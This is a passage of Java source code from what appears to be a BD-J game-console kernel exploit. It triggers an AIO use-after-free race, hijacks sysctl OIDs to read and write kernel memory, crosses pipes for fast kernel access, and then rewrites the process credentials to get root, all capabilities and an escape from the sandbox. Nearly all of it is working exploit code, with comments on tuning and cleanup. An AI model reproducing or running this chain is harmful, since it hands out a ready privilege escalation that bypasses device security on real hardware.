    int requestSize = off.aioRequestSize;
    long sprayedIds = alloc(4 * TUNE_REQUESTS * (TUNE_SPRAYS + 1));
    long timeout = alloc(16);
    writeU32(timeout, 0, TUNE_WAIT_TIMEOUT_US);

    long churnRequest = (0x80000000L | (((long)TUNE_REQUESTS * requestSize) << 16) | 0x4101L);

    int preflight = ioctl(0xffffffff, churnRequest, nodes);
    if (preflight != -1) return -1;

    /* CHURN_BEFORE - tight loop in main thread for precise timing (no sleep!) */
    for (int i = 0; i < TUNE_CHURN_BEFORE; i++) {
        ioctl(0xffffffff, churnRequest, nodes);
    }

    /* Critical: aio_multi_wait with mode 0 frees the waiter array and leaves a
     * dangling head on the group (the UAF). */
    aioMultiWait(group.ids, group.count, scratchStates, 0, timeout);

    /* CHURN_AFTER - tight loop in main thread for precise timing */
    for (int i = 0; i < TUNE_CHURN_AFTER; i++) {
        ioctl(0xffffffff, churnRequest, nodes);
    }

    /* Reclaim the freed waiter array with crafted request objects. */
    int accepted = 0;
    for (int i = 0; i < TUNE_SPRAYS; i++) {
        long sprayIds = sprayedIds + i * 4 * TUNE_REQUESTS;
        int rv = aioSubmitCmd(AIO_CMD_READ, nodes, TUNE_REQUESTS, 3, sprayIds);
        if (rv == 0) accepted++;
    }

    return accepted;
}

private static int cancelRequest(long id) {
    return aioMultiCancel(id, 1, scratchStates);
}

private static int firstPendingRequest(AioGroup group) {
    aioMultiPoll(group.ids, group.count, scratchStates);

    for (int index = 0; index < group.count; index++) {
        int state = readU32(scratchStates, index * 4) & 0xffff;
        if (state != 1) continue;

        int canary = group.count - 1;
        if (canary != index) cancelRequest(group.ids + canary * 4);
        return index;
    }
    return -1;
}

private static ReclaimResult reclaimWaiterArray(String tag, long firstTarget, long secondTarget) {
    AioGroup group = claimPendingRequests(TUNE_WAITERS);
    rememberArmedGroup(group);

    long nodes = alloc(TUNE_REQUESTS * off.aioRequestSize);
    buildWaiterNodes(nodes, TUNE_REQUESTS, firstTarget, secondTarget);
    int accepted = runReclaimBatch(group, nodes);
    if (accepted < 0) {
        Status.println(tag + ": invalid churn request");
        return null;
    }
    if (accepted != TUNE_SPRAYS) {
        Status.println(tag + ": " + (TUNE_SPRAYS - accepted) + " reclaim submits failed");
        return null;
    }

    int firstPending = firstPendingRequest(group);
    if (firstPending < 0) {
        Status.println(tag + ": no pending request is available");
        return null;
    }

    ReclaimResult result = new ReclaimResult();
    result.group = group;
    result.firstPending = firstPending;
    result.heads = group.count - 1;
    return result;
}

private static boolean flipOidKind(String tag, ReclaimResult reclaim, int[] mib, int target) {
    Integer kind = oidKind(mib);
    if (kind == null) {
        Status.println(tag + ": oid is hidden before the flip");
        return false;
    }

    for (int i = 0; i < reclaim.heads && kind.intValue() != target; i++) {
        cancelRequest(reclaim.group.ids + i * 4);
        Integer next = oidKind(mib);
        if (next == null) {
            Status.println(tag + ": oid disappeared during the flip");
            return false;
        }
        kind = next;

        if (((kind.intValue() >>> 24) & 0xff) < ((target >>> 24) & 0xff)) {
            Status.println(tag + ": oid flip overshot into oid_arg1");
            return false;
        }
    }

    if (kind.intValue() != target) {
        Status.println(tag + ": not enough waiter heads");
        return false;
    }
    return true;
}

/* slow kernel read/write via sysctl oid window */
private static int setWindowLow(int value) {
    return sysctlWriteInt(mibA, value);
}

private static int setWindowHigh(int value) {
    if (mibC != null) return sysctlWriteInt(mibC, value);

    if (windowHigh != 0xFFFFFFFFL) return -1;
    long selfHigh = kaddr(off.oidB_arg1 + 4);
    int rv = setWindowLow((int) (selfHigh & 0xFFFFFFFFL));
    if (rv != 0) return rv;
    return sysctlWriteInt(mibB, value);
}

private static int aimWindow(long address) {
    long high = (address >>> 32) & 0xFFFFFFFFL;
    if (windowHigh != high) {
        int rv = setWindowHigh((int) high);
        if (rv != 0) return rv;
        windowHigh = high;
    }
    return setWindowLow((int) (address & 0xFFFFFFFFL));
}

private static SysctlResult kread32Slow(long address) {
    if (aimWindow(address) != 0) return new SysctlResult(-1, 0);
    return sysctlReadInt(mibB);
}

private static int kwrite32Slow(long address, int value) {
    if (aimWindow(address) != 0) return -1;
    return sysctlWriteInt(mibB, value);
}

private static SysctlResult kread64Slow(long address) {
    SysctlResult low = kread32Slow(address);
    SysctlResult high = kread32Slow(address + 4);
    if (low.rv != 0 || high.rv != 0) return new SysctlResult(-1, 0);
    return new SysctlResult(0, low.value, ((long) high.value) << 32);
}

private static int kwrite64Slow(long address, long value) {
    int rv = kwrite32Slow(address, (int) (value & 0xFFFFFFFFL));
    if (rv != 0) return rv;
    return kwrite32Slow(address + 4, (int) (value >>> 32));
}

private static boolean prepareHighWriter() {
    long cKind = kaddr(off.oidC_kind);
    long cArg1 = kaddr(off.oidC_arg1);
    long bArg1Plus4 = kaddr(off.oidB_arg1 + 4);
    int writableKind = off.oidWritableKind;

    if (windowHigh != 0xFFFFFFFFL) {
        Status.println("kernel rw: writer window already left the kernel image");
        return false;
    }
    if (kwrite32Slow(cKind, writableKind) != 0) return false;
    if (kwrite64Slow(cArg1, bArg1Plus4) != 0) return false;

    SysctlResult probe = sysctlReadInt(off.oidC_mib);
    if (probe.rv != 0 || probe.value != 0xFFFFFFFF) {
        Status.println("kernel rw: high writer self-test failed");
        return false;
    }

    mibC = off.oidC_mib;
    return true;
}

private static final int ARM_ATTEMPTS = 5;

private static boolean makeOidWritable(String tag, int[] mib, long kindByteAddr) {
    /* The original performs the churn/wait/spray as one atomic ROP chain, which
     * guarantees the reclaim lands on the just-freed waiter array.  BD-J cannot
     * do ROP (no gadgets: .text is XO, JIT is gated), so each syscall runs
     * separately and the overlap is only probabilistic -- retry with a fresh
     * group until it lands. */
    for (int attempt = 0; attempt < ARM_ATTEMPTS; attempt++) {
        Integer kind = oidKind(mib);
        if (kind == null) {
            Status.println(tag + ": oid is hidden");
            return false;
        }
        if (kind.intValue() == off.oidWritableKind) return true;    /* already writable */
        if (kind.intValue() != off.oidOriginalKind) {
            Status.println(tag + ": oid kind drifted to 0x" + Integer.toHexString(kind.intValue())
                           + " (partial overlap) - stopping");
            return false;
        }

        ReclaimResult reclaim = reclaimWaiterArray(tag + "#" + attempt, kaddr(off.oidA_deadSink), kindByteAddr);
        if (reclaim == null) continue;
        if (flipOidKind(tag + "#" + attempt, reclaim, mib, off.oidWritableKind)) {
            Status.println(tag + ": armed on attempt " + attempt);
            return true;
        }
    }
    Status.println(tag + ": not armed after " + ARM_ATTEMPTS + " attempts");
    return false;
}

private static boolean steerOidWindow() {
    Integer kindB = oidKind(mibB);
    if (kindB != null) {
        Status.println("Kernel: oid is already visible");
        return false;
    }

    SysctlResult aValue = sysctlReadInt(mibA);
    if (aValue.rv != 0) {
        Status.println("Kernel: steering oid is not readable");
        return false;
    }

    ReclaimResult reclaim = reclaimWaiterArray("Kernel", kaddr(off.oidA_arg1Byte1), kaddr(off.oidB_visible));
    if (reclaim == null) return false;

    cancelRequest(reclaim.group.ids + reclaim.firstPending * 4);

    SysctlResult steered = sysctlReadInt(mibA);
    int expected = (int) (kaddr(off.oidB_arg1Value) & 0xFFFFFFFFL);
    if (steered.rv != 0 || steered.value != expected) {
        Status.println("Kernel: oid steering check failed");
        return false;
    }
    windowHigh = 0xFFFFFFFFL;
    return true;
}

private static boolean testKernelRead() {
    Integer kindViaOidfmt = oidKind(mibB);
    SysctlResult kindViaRead = kread32Slow(kaddr(off.oidB_kind));
    boolean ok = (kindViaOidfmt != null && kindViaRead.rv == 0 && kindViaRead.value == kindViaOidfmt.intValue());
    if (!ok) Status.println("Kernel: read self-test failed");
    return ok;
}

private static boolean testKernelWrite() {
    long counter = kaddr(off.walkCounterAddr);
    int[] mib = off.walkCounterMib;
    SysctlResult before = sysctlReadInt(mib);
    int rv = kwrite32Slow(counter, 0x41424344);
    SysctlResult after = sysctlReadInt(mib);
    boolean ok = (rv == 0 && after.value == 0x41424344);
    if (ok) kwrite32Slow(counter, before.value);
    else Status.println("Kernel: write self-test failed");
    return ok;
}

private static boolean armKernelReadWrite() {
    Status.println("Arming kernel read/write via AIO race...");

    scratchStates = alloc(0x400);
    scratchQword = alloc(8);

    mibA = nameToMib("kern.smp.cpus");
    mibB = nameToMib("kern.smp.maxcpus");
    if (mibA == null || mibB == null) {
        Status.println("Kernel: nameToMib failed");
        return false;
    }

    Integer kindA = oidKind(mibA);
    if (kindA == null || kindA.intValue() != off.oidOriginalKind) {
        Status.println("Kernel: unexpected oid state");
        return false;
    }

    raiseFdLimit();
    parkAioWorkers(TUNE_WORKER_BLOCKERS);

    if (!makeOidWritable("arm a", mibA, kaddr(off.oidA_kindByte3))) return false;
    if (!steerOidWindow()) return false;
    if (!testKernelRead()) return false;
    if (!makeOidWritable("arm c", mibB, kaddr(off.oidB_kindByte3))) return false;
    if (!testKernelWrite()) return false;

    return prepareHighWriter();
}

/* ===================================================================== */
/* find current process (uses slow R/W)                                  */
/* ===================================================================== */

private static long readKernelPointerSlow(long addr) {
    SysctlResult r = kread64Slow(addr);
    if (r.rv != 0) return 0;
    long val = r.longValue;   /* full 64-bit pointer; .value is only the low dword */
    return isKernelPointer(val) ? val : 0;
}

private static long findProcess(int targetPid) {
    long head = readKernelPointerSlow(kaddr(off.allproc));
    if (head == 0) return 0;

    long proc = head;
    for (int hop = 0; hop < 4096; hop++) {
        SysctlResult pidResult = kread32Slow(proc + off.procPid);
        if (pidResult.rv != 0) return 0;
        int pid = pidResult.value;
        if (pid < 0 || pid > 0x40000) return 0;
        if (pid == targetPid) return proc;

        long next = readKernelPointerSlow(proc);
        if (next == 0) return 0;
        proc = next;
    }
    return 0;
}

private static boolean findCurrentProcess() {
    int myPid = getpid();
    long proc = findProcess(myPid);
    if (proc == 0) {
        Status.println("Process: current process is not in allproc");
        return false;
    }
    curproc = proc;

    long fdPtr = readKernelPointerSlow(curproc + off.procFd);
    if (isKernelPointer(fdPtr)) procFdAddr = fdPtr;

    long aioPtr = readKernelPointerSlow(curproc + off.procAioInfo);
    long ucredPtr = readKernelPointerSlow(curproc + off.procUcred);
    if (isKernelPointer(ucredPtr)) ucred = ucredPtr;

    boolean ok = isKernelPointer(aioPtr);
    if (ok) {
        aioInfoAddr = aioPtr;
        Status.println("aio_info_addr: 0x" + Long.toHexString(aioInfoAddr));
    } else {
        Status.println("Process: aio info pointer is invalid");
    }
    if (ucred != 0) Status.println("ucred_addr: 0x" + Long.toHexString(ucred));

    Status.println("curproc : 0x" + Long.toHexString(curproc));
    Status.println("ucred   : 0x" + Long.toHexString(ucred));
    Status.println("procFd  : 0x" + Long.toHexString(procFdAddr));
    return ok;
}

/* ===================================================================== */
/* locate pipes                                                          */
/* ===================================================================== */

private static PipeInfo findPipe(long fdp, int fd, String label) {
    long table = readKernelPointerSlow(fdp + off.filedescFiles);
    if (table == 0) {
        Status.println("Pipes: " + label + " file table is invalid");
        return null;
    }

    SysctlResult countResult = kread32Slow(table + off.filedescTableNfiles);
    if (countResult.rv != 0) return null;
    int count = countResult.value;
    if (fd >= count) {
        Status.println("Pipes: " + label + " descriptor is outside the file table");
        return null;
    }

    long entry = off.filedescTableOfiles + fd * off.filedescTableEntryStride;
    long file = readKernelPointerSlow(table + entry);
    if (file == 0) {
        Status.println("Pipes: " + label + " file pointer is invalid");
        return null;
    }

    long pipe = readKernelPointerSlow(file + off.filedescTableFileData);
    if (pipe == 0) {
        Status.println("Pipes: " + label + " pipe pointer is invalid");
        return null;
    }

    long pair = readKernelPointerSlow(pipe + off.pipePair);
    boolean isReadEnd = (pair != 0) && ((pair & 0xFFFFFFFFFFFFFFFFL) == (pipe & 0xFFFFFFFFFFFFFFFFL));
    return new PipeInfo(pipe, isReadEnd);
}

private static boolean locatePipes() {
    long fdp = readKernelPointerSlow(curproc + off.procFd);
    if (fdp == 0) {
        Status.println("Pipes: process file table is invalid");
        return false;
    }

    long probe = alloc(8);
    long[] locatedPipes = new long[2];
    int[] locatedReadFd = new int[2];
    int[] locatedWriteFd = new int[2];
    long[] locatedBuffers = new long[2];
    int[] locatedSizes = new int[2];

    for (int i = 0; i < 2; i++) {
        String label = (i == 0) ? "master" : "victim";
        Int32Array fds = new Int32Array(2);
        if (pipe2(fds, 0) != 0) {
            Status.println("Pipes: could not create the " + label + " pipe");
            return false;
        }
        int readFd = fds.get(0);
        int writeFd = fds.get(1);
        trackFd(readFd);
        trackFd(writeFd);

        PipeInfo info = findPipe(fdp, readFd, label);
        if (info == null) return false;
        if (!info.isReadEnd) {
            Status.println("Pipes: " + label + " pipe self-check failed");
            return false;
        }

        writeU32(probe, 0, 0x5a);
        write(writeFd, probe, 1);
        SysctlResult count = kread32Slow(info.pipe + off.pipeCount);
        if (count.value != 1) {
            Status.println("Pipes: " + label + " pipe counter check failed");
            return false;
        }

        long originalBuffer = readKernelPointerSlow(info.pipe + off.pipeBuffer);
        SysctlResult originalSize = kread32Slow(info.pipe + off.pipeSize);
        if (originalBuffer == 0 || originalSize.rv != 0 || originalSize.value == 0) {
            Status.println("Pipes: " + label + " pipe buffer could not be recorded");
            return false;
        }

        locatedPipes[i] = info.pipe;
        locatedReadFd[i] = readFd;
        locatedWriteFd[i] = writeFd;
        locatedBuffers[i] = originalBuffer;
        locatedSizes[i] = originalSize.value;
    }

    master = new RelapsePipe(locatedPipes[0], locatedReadFd[0], locatedWriteFd[0], true);
    victim = new RelapsePipe(locatedPipes[1], locatedReadFd[1], locatedWriteFd[1], true);
    master.originalBuffer = locatedBuffers[0];
    master.originalSize = locatedSizes[0];
    victim.originalBuffer = locatedBuffers[1];
    victim.originalSize = locatedSizes[1];

    Status.println("master pipe fd: " + master.readFd + "/" + master.writeFd);
    Status.println("victim pipe fd: " + victim.readFd + "/" + victim.writeFd);

    return true;
}

/* ===================================================================== */
/* pipe cross (manual corruption -> fast R/W)                           */
/* ===================================================================== */

private static int aimVictim(long address, int count, int size) {
    clear(aimBuffer, 0x18);
    writeU32(aimBuffer, off.pipeCount, count);
    writeU32(aimBuffer, off.pipeSize, size);
    writeU64(aimBuffer, off.pipeBuffer, address);

    int written = write(master.writeFd, aimBuffer, 0x18);
    int drained = read(master.readFd, drainBuffer, 0x18);
    return (written == 0x18 && drained == 0x18) ? 0 : -1;
}

private static int kreadFast(long address, int length, long dest) {
    if (aimVictim(address, length, (int) pipeSize) != 0) return -1;
    return read(victim.readFd, dest, length);
}

private static int kwriteFast(long address, int length, long src) {
    if (aimVictim(address, 0, (int) pipeSize) != 0) return -1;
    return write(victim.writeFd, src, length);
}

private static int readKernel32Fast(long address) {
    if (kreadFast(address, 4, scratchQword) != 4) return -1;
    return readU32(scratchQword, 0);
}

private static long readKernel64Fast(long address) {
    if (kreadFast(address, 8, scratchQword) != 8) return 0;
    return readU64(scratchQword, 0);
}

private static boolean writeKernel32Fast(long address, int value) {
    writeU32(scratchQword, 0, value);
    return kwriteFast(address, 4, scratchQword) == 4;
}

private static boolean writeKernel64Fast(long address, long value) {
    writeU32(scratchQword, 0, (int) (value & 0xFFFFFFFFL));
    writeU32(scratchQword, 4, (int) (value >>> 32));
    return kwriteFast(address, 8, scratchQword) == 8;
}

private static boolean crossPipes() {
    long masterPipe = master.pipe;
    long victimPipe = victim.pipe;

    pipeSize = off.pipeDefaultSize;
    aimBuffer = alloc(0x20);
    drainBuffer = alloc(0x40);

    SysctlResult inValue = kread32Slow(masterPipe + off.pipeIn);
    SysctlResult outValue = kread32Slow(masterPipe + off.pipeOut);
    if (inValue.rv != 0 || inValue.value != 1 || outValue.value != 0) {
        Status.println("pipes: master pipe is not in the expected state");
        return false;
    }
    read(master.readFd, drainBuffer, 1);

    int[][] fields = {
        {off.pipeCount, 0},
        {off.pipeIn, 0},
        {off.pipeOut, 0},
        {off.pipeSize, (int) pipeSize},
        {off.pipeBuffer, (int) (victimPipe & 0xFFFFFFFFL)},
        {off.pipeBuffer + 4, (int) (victimPipe >>> 32)}
    };

    for (int i = 0; i < fields.length; i++) {
        int offset = fields[i][0];
        int value = fields[i][1];
        boolean ok = false;
        for (int attempt = 0; attempt < 3 && !ok; attempt++) {
            if (kwrite32Slow(masterPipe + offset, value) != 0) continue;
            SysctlResult readBack = kread32Slow(masterPipe + offset);
            ok = (readBack.rv == 0 && readBack.value == value);
        }
        if (!ok) {
            Status.println("Pipes: could not update the master pipe");
            return false;
        }
    }
    crossed = true;

    long rodataAddr = kaddr(off.rodataProbeRva);
    long out = alloc(0x40);
    int got = kreadFast(rodataAddr, off.rodataProbeText.length(), out);
    StringBuffer read = new StringBuffer();   /* StringBuilder is Java 5; BD-J VM is ~1.4 */
    for (int i = 0; i < off.rodataProbeText.length(); i++) {
        read.append((char) readU8(out, i));
    }
    boolean match = (got == off.rodataProbeText.length() && read.toString().equals(off.rodataProbeText));
    if (!match) Status.println("Pipes: kernel read check failed");
    return match;
}

/* ===================================================================== */
/* privilege escalation                                                  */
/* ===================================================================== */

private static boolean escalate() {
    if (!crossed || ucred == 0) {
        Status.println("Privileges: kernel rw or credentials are missing");
        return false;
    }

    long rootvnode = readKernelPointerSlow(kaddr(off.rootvnode));
    if (rootvnode == 0) {
        Status.println("Privileges: could not find rootvnode");
        return false;
    }

    // Zero uid/ruid/svuid
    writeKernel32Fast(ucred + off.ucredUid, 0);
    writeKernel32Fast(ucred + off.ucredRuid, 0);
    writeKernel32Fast(ucred + off.ucredSvuid, 0);

    // Set ngroups = 1
    writeKernel32Fast(ucred + off.ucredNgroups, 1);

    // Zero rgid/svgid
    writeKernel32Fast(ucred + off.ucredRgid, 0);
    writeKernel32Fast(ucred + off.ucredSvgid, 0);

    // Set sceAuthId = sysCoreAuthId
    long authId = (off.sysCoreAuthIdHi << 32) | (off.sysCoreAuthIdLo & 0xFFFFFFFFL);
    writeKernel64Fast(ucred + off.ucredSceAuthId, authId);

    // Set capabilities to all
    writeKernel64Fast(ucred + off.ucredSceCaps, 0xFFFFFFFFFFFFFFFFL);
    writeKernel64Fast(ucred + off.ucredSceCaps1, 0xFFFFFFFFFFFFFFFFL);

    // Set sceAttrs low dword bit 0x80000000, preserving its upper 8 bits.
    long attrsLow = readKernel32Fast(ucred + off.ucredSceAttrs) & 0xFFFFFFFFL;
    long attrsHigh = readKernel32Fast(ucred + off.ucredSceAttrs + 4) & 0xFFFFFFFFL;
    long attrs = (attrsHigh << 32) | ((attrsLow & 0x00FFFFFFL) | 0x80000000L);
    writeKernel64Fast(ucred + off.ucredSceAttrs, attrs);

    // Set fdp cdir/rdir = rootvnode, jdir = 0
    long p_fd = readKernel64Fast(curproc + off.procFd);
    writeKernel64Fast(p_fd + off.filedescCdir, rootvnode);
    writeKernel64Fast(p_fd + off.filedescRdir, rootvnode);
    writeKernel64Fast(p_fd + off.filedescJdir, 0);

    // Unlock dynlib syscall range + disable restrictFlags + set libkernelRef
    boolean dynlibPatched = false;
    long p_dynlib = readKernel64Fast(curproc + off.procDynlib);
    if (isKernelPointer(p_dynlib)) {
        writeKernel64Fast(p_dynlib + off.dynlibSyscallStart, 0);
        writeKernel64Fast(p_dynlib + off.dynlibSyscallEnd, 0xFFFFFFFFFFFFFFFFL);
        /* Poops deliberately leaves dynlib+0x118 and +0x18 alone on BD-J;
         * those WebKit-only writes are not needed for the kexp launch. */

        /* Whitelist the eboot's first segment.  The BD-J kernel validates
         * dlsym/syscall call sites against the eboot segment table; kexp
         * runs from JIT shared memory and would otherwise be rejected.
         * Poops relies on exactly these two writes before AioShellcode. */
        long dynlibEboot = readKernel64Fast(p_dynlib + DYNLIB_EBOOT);
        if (isKernelPointer(dynlibEboot)) {
            long ebootSegments = readKernel64Fast(dynlibEboot + DYNLIB_SEGMENTS);
            if (isKernelPointer(ebootSegments)) {
                boolean wroteAddr = writeKernel64Fast(
                    ebootSegments + DYNLIB_SEGMENT_ADDR, 0);
                boolean wroteSize = writeKernel64Fast(
                    ebootSegments + DYNLIB_SEGMENT_SIZE, 0xFFFFFFFFFFFFFFFFL);
                long addrBack = readKernel64Fast(
                    ebootSegments + DYNLIB_SEGMENT_ADDR);
                long sizeBack = readKernel64Fast(
                    ebootSegments + DYNLIB_SEGMENT_SIZE);
                dynlibPatched = wroteAddr && wroteSize
                    && addrBack == 0
                    && sizeBack == 0xFFFFFFFFFFFFFFFFL;
                if (dynlibPatched) {
                    Status.println("Privileges: eboot segment whitelisted @ 0x"
                                   + Long.toHexString(ebootSegments));
                } else {
                    Status.println("Privileges: eboot segment whitelist failed"
                                   + " (addr=0x" + Long.toHexString(addrBack)
                                   + " size=0x" + Long.toHexString(sizeBack) + ")");
                }
            } else {
                Status.println("Privileges: eboot segment table pointer is invalid");
            }
        } else {
            Status.println("Privileges: eboot dynlib pointer is invalid");
        }
    } else {
        Status.println("Privileges: dynlib pointer is invalid");
    }

    int uidAfter = getuid();
    int sandboxAfter = isInSandbox();
    boolean ok = dynlibPatched && uidAfter == 0 && sandboxAfter == 0;
    if (!dynlibPatched) {
        Status.println("Privileges: kexp launch requires the eboot whitelist");
    }
    if (uidAfter != 0 || sandboxAfter != 0) {
        Status.println("Privileges: uid or sandbox check failed");
    }
    Status.println(ok ? "Privilege escalation complete"
                      : "Privilege escalation incomplete");
    return ok;
}

/* ===================================================================== */
/* lookup AIO group                                                      */
/* ===================================================================== */

private static long lookupAioGroup(long table, int id) {
    int index = id & 0x1fff;

    SysctlResult pageCountResult = kread32Slow(table + off.aioIdTablePages);
    if (pageCountResult.rv != 0 || pageCountResult.value == 0 || pageCountResult.value > 64)
        return 0;
    if (index >= (pageCountResult.value << 7))
        return 0;

    long page = readKernelPointerSlow(table + ((index >>> 7) * 8));
    if (page == 0) return 0;

    long slot = page + (id & 0x7f) * off.aioIdTableSlotStride;
    SysctlResult generation = kread32Slow(slot + 0x28);
    if (generation.rv != 0) return 0;
    if (((((generation.value & 0xffff) << 13) | index) & 0xffff) != id)
        return 0;

    SysctlResult state = kread32Slow(slot + 0x24);
    if (state.rv != 0 || (state.value >>> 16) != 3) return 0;

    SysctlResult type = kread32Slow(slot + 0x20);
    if (type.rv != 0 || (type.value & 0xffff) != off.aioIdTableEntryType)
        return 0;

    return readKernelPointerSlow(slot + 0x10);
}

/* ===================================================================== */
/* defuse AIO groups                                                     */
/* ===================================================================== */

private static boolean defuseAioGroups() {
    if (defused) return true;
    if (curproc == 0) {
        Status.println("cleanup: current process is missing");
        return false;
    }

    long table = readKernelPointerSlow(curproc + off.procAioInfo);
    if (!isKernelPointer(table)) {
        Status.println("cleanup: aio table pointer is invalid");
        return false;
    }

    int total = 0, alreadyClear = 0, cleared = 0, skipped = 0, failed = 0;

    for (int gi = 0; gi < armedGroupsLen; gi++) {
        int count = armedGroupCounts[gi];
        int start = 0;
        for (int k = 0; k < gi; k++) start += armedGroupCounts[k];

        for (int i = 0; i < count; i++) {
            total++;
            int id = armedGroupIds[start + i];
            long group = lookupAioGroup(table, id);
            if (group == 0) {
                skipped++;
                continue;
            }

            long shared = readKernelPointerSlow(group + 0x10);
            if (shared == 0) {
                skipped++;
                continue;
            }

            SysctlResult groupNum = kread32Slow(shared + off.aioGroupNum);
            SysctlResult groupState = kread32Slow(shared + off.aioGroupState);
            if (groupNum.value != 1 || groupState.value < 1 || groupState.value > 4) {
                skipped++;
                continue;
            }

            SysctlResult head = kread64Slow(shared + off.aioGroupWaiters);
            if (head.longValue == 0) {
                alreadyClear++;
                continue;
            }

            boolean headCleared = false;
            for (int attempt = 0; attempt < 3 && !headCleared; attempt++) {
                kwrite32Slow(shared + off.aioGroupWaiters, 0);
                kwrite32Slow(shared + off.aioGroupWaiters + 4, 0);
                SysctlResult back = kread64Slow(shared + off.aioGroupWaiters);
                headCleared = (back.rv == 0 && back.longValue == 0);
            }
            if (headCleared) cleared++;
            else failed++;
        }
    }

    boolean ok = (skipped == 0 && failed == 0 && cleared + alreadyClear == total);
    defused = true;
    if (!ok) {
        Status.println("cleanup: aio cleanup failed (" + skipped + " skipped, " + failed + " failed)");
    }
    return ok;
}

/* ===================================================================== */
/* restore / cleanup                                                     */
/* ===================================================================== */

/* Restore the three hijacked OIDs through the fast pipe primitive.
 *
 * Kept for reference, but no longer called from cleanup: the fast primitive
 * cannot repair the last pipe (each aim overwrites the field being repaired),
 * while restoring these OIDs kills the slow window that can.  The OIDs are
 * therefore deliberately left hijacked until the next boot; the pipes are
 * repaired with the slow window instead. */
private static void restoreOids() {
    if (!crossed) return;

    long aKind = kaddr(off.oidA_kind);
    long aArg1 = kaddr(off.oidA_arg1);
    long aArg1Value = kaddr(off.oidA_arg1Value);
    long bKind = kaddr(off.oidB_kind);
    long bArg1 = kaddr(off.oidB_arg1);
    long bArg1Value = kaddr(off.oidB_arg1Value);
    long cKind = kaddr(off.oidC_kind);
    long cArg1 = kaddr(off.oidC_arg1);
    long cArg1Value = kaddr(off.oidC_arg1Value);
    int originalKind = off.oidOriginalKind;

    writeKernel64Fast(aArg1, aArg1Value);
    writeKernel64Fast(bArg1, bArg1Value);
    writeKernel64Fast(cArg1, cArg1Value);

    writeKernel32Fast(aKind, originalKind);
    writeKernel32Fast(bKind, originalKind);
    writeKernel32Fast(cKind, originalKind);

    writeKernel32Fast(kaddr(off.oidB_visible), 0);
    writeKernel32Fast(kaddr(off.oidA_deadSink), 0);
    writeKernel32Fast(kaddr(off.walkCounterAddr), 0);

    mibC = null;

    SysctlResult cpus = sysctlReadInt(mibA);
    Integer stillVisible = oidKind(mibB);
    boolean ok = (cpus.rv == 0 && stillVisible == null);
    if (!ok) Status.println("Cleanup: oid restore check failed");
}

/* Restore a pipe's own buffer/size and empty it.  The slow sysctl window is
 * used (not the crossed pipes) because the fast primitive cannot restore the
 * last pipe without re-aiming it at a struct: every fast write starts by
 * overwriting the field being repaired.  Closing a pipe whose buffer alias is
 * not repaired hands pipe_free_kmem() a peer struct instead of the vm_map
 * allocation, which panics the console at process exit. */
private static boolean restorePipeStruct(RelapsePipe pipe, String label) {
    if (pipe == null) return true;
    if (pipe.originalBuffer == 0 || pipe.originalSize == 0) {
        Status.println("Cleanup: " + label + " pipe has no recorded buffer");
        return false;
    }

    boolean ok = false;
    for (int attempt = 0; attempt < 3 && !ok; attempt++) {
        boolean wrote = kwrite32Slow(pipe.pipe + off.pipeCount, 0) == 0;
        wrote &= kwrite32Slow(pipe.pipe + off.pipeIn, 0) == 0;
        wrote &= kwrite32Slow(pipe.pipe + off.pipeOut, 0) == 0;
        wrote &= kwrite32Slow(pipe.pipe + off.pipeSize, pipe.originalSize) == 0;
        wrote &= kwrite64Slow(pipe.pipe + off.pipeBuffer, pipe.originalBuffer) == 0;

        SysctlResult count = kread32Slow(pipe.pipe + off.pipeCount);
        SysctlResult in = kread32Slow(pipe.pipe + off.pipeIn);
        SysctlResult out = kread32Slow(pipe.pipe + off.pipeOut);
        SysctlResult size = kread32Slow(pipe.pipe + off.pipeSize);
        SysctlResult buffer = kread64Slow(pipe.pipe + off.pipeBuffer);
        ok = wrote
            && count.rv == 0 && count.value == 0
            && in.rv == 0 && in.value == 0
            && out.rv == 0 && out.value == 0
            && size.rv == 0 && size.value == pipe.originalSize
            && buffer.rv == 0 && buffer.longValue == pipe.originalBuffer;
    }

    if (!ok) Status.println("Cleanup: " + label + " pipe restore failed");
    return ok;
}

private static void restorePipes() {
    boolean any = (shellMaster != null || shellVictim != null || master != null || victim != null);
    if (!any) return;
    crossed = false;

    /* Shell pipes first, then the fast-R/W pair.  Every write goes through the
     * slow window, so the order is not load-bearing; the master itself is
     * restored third, which is also the write that ends the fast primitive. */
    boolean ok = true;
    ok &= restorePipeStruct(shellMaster, "kexp master");
    ok &= restorePipeStruct(shellVictim, "kexp victim");
    ok &= restorePipeStruct(master, "master");
    ok &= restorePipeStruct(victim, "victim");

    Status.println(ok ? "Cleanup: all pipes restored (close should be safe)"
                      : "Cleanup: at least one pipe is still armed (reboot after closing)");
}

private static void releaseAioWorkers() {
    int writeFd = (int) workerParkWriteFd;
    int readFd = (int) workerParkReadFd;
    if (writeFd == 0 && readFd == 0) return;

    /* Closing the write end wakes the parked reads; the read end is then
     * closed after the workers have drained.  Untrack both descriptors
     * before closing so closeScratchDescriptors cannot close the same
     * numbers a second time after the JVM has reused them. */
    workerParkWriteFd = 0;
    workerParkReadFd = 0;

    try {
        if (writeFd > 2) {
            untrackFd(writeFd);
            close(writeFd);
        }
        if (readFd > 2) {
            sleep(120);
            untrackFd(readFd);
            close(readFd);
        }
    } catch (Exception e) {
        Status.println("Cleanup: could not release aio workers");
    }
}

private static void closeScratchDescriptors() {
    boolean[] keep = new boolean[fdsCount];
    if (master != null) {
        for (int i = 0; i < fdsCount; i++) {
            if (fds[i] == master.readFd || fds[i] == master.writeFd) keep[i] = true;
        }
    }
    if (victim != null) {
        for (int i = 0; i < fdsCount; i++) {
            if (fds[i] == victim.readFd || fds[i] == victim.writeFd) keep[i] = true;
        }
    }

    for (int i = 0; i < fdsCount; i++) {
        if (!keep[i] && fds[i] > 2) close(fds[i]);
    }
    fdsCount = 0;
}

private static void cleanup() {
    try {
        restoreThreadAttributes();

        if (armedGroupsLen != 0 && !defused) {
            Status.println("Cleanup: repairing aio groups");
            if (curproc == 0) findCurrentProcess();
            if (curproc != 0) defuseAioGroups();
            else Status.println("Cleanup: current process unavailable");
        }

        restorePipes();
        Status.println("Cleanup: sysctl OIDs left hijacked until reboot");
        releaseAioWorkers();
        closeScratchDescriptors();
    } catch (Throwable t) {
        Status.printStackTrace("Cleanup failed: ", t);
    }
}

/* Post-launch teardown.  elfldr is up and no longer needs any of the crossed
 * pipes: kexp ran on its own pipe2 and has returned.  Put both the shell pipes
 * and the fast-R/W pipes back to ordinary buffers through the slow window so
 * pipe_dtor() frees real allocations when the fds close at process exit.  The
 * OIDs stay hijacked because the window that repairs the pipes cannot restore
 * itself.  No f_count holds -- holding leaks the files (BUDGET_FD_FILE) and the
